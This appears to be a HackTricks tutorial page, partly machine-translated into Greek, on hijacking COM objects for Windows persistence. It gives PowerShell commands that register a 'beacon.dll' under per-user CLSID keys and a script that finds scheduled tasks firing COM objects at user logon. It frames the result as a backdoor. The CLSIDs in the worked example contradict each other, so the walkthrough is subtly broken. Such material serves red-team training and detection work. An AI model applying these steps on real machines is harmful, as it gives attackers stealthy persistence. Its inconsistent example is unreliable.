# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζητώντας ανύπαρκτα COM components

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, **COM Hijacking** θα μπορούσε να χρησιμοποιηθεί ως **μόνιμη μηχανισμός**. Χρησιμοποιώντας το `procmon`, είναι εύκολο να βρείτε αναζητημένα COM registry που δεν υπάρχουν και που ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να παραμείνει. Φίλτρα:

- **RegOpenKey** λειτουργίες.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει με **InprocServer32**.

Αφού αποφασίσετε ποιο ανύπαρκτο COM να προσποιηθείτε, εκτελέστε τις παρακάτω εντολές. _Να είστε προσεκτικοί αν αποφασίσετε να προσποιηθείτε ένα COM που φορτώνεται κάθε λίγα δευτερόλεπτα, καθώς αυτό θα μπορούσε να είναι υπερβολικό._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Παράδειγμα
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Checking the output you can select one that is going to be executed **κάθε φορά που συνδέεται ένας χρήστης** for example.

Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Στη συνέχεια, μπορείτε απλώς να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, η πίσω πόρτα σας θα ενεργοποιείται.

{{#include ../../banners/hacktricks-training.md}}
